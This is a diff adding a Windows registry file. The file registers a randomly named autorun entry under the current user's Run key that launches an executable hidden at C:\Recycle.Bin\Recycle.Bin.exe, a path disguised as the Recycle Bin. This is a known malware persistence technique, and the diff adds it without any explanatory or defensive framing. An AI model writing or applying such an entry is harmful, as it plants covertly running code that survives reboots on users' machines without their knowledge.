@@ -1,0 +1,4 @@
+REGEDIT4
+
+[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+"4E3E0230AEBB4E96"="C:\\Recycle.Bin\\Recycle.Bin.exe"
